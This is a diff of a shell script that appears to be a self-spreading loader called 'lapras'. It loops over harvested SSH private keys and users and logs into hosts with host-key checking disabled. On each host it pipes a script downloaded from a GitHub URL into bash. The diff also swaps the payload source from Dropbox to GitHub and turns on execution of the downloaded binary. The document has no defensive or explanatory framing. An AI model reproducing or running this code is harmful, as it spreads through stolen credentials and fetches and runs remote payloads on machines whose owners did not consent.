@@ -24,19 +24,16 @@ for user in $users; do
         for key in $keys; do
             chmod +r $key; chmod 400 $key
 
-            ssh -o StrictHostKeyChecking=no -o BatchModesyes -o ConnectTimeout=5 -i $key $user@$host "(curl -kL $URL || wget -q --no-check-certificate -O- $URL ) | bash"
+            ssh -o StrictHostKeyChecking=no -o BatchModesyes -o ConnectTimeout=5 -i $key $user@$host "(curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash"
         done
     done
 done
 }
 
-# we need to download the final executable and run it
-curl -L -o lapras_payload https://www.dropbox.com/scl/fi/qjoyx52sxn8mfhgggg5a4/98.png?rlkey=s6jia0fivu7gcycwcliz45tk6&st=n1ojh54u&dl=0
+curl -L -o payload https://github.com/proxin187/lapras/raw/refs/heads/main/payload || wget -q --no-check-certificate -O payload https://github.com/proxin187/lapras/raw/refs/heads/main/payload
 
-echo "download done!"
+chmod +x payload
 
-chmod +x lapras_payload
-
-# ./lapras_payload
+./payload
 
 
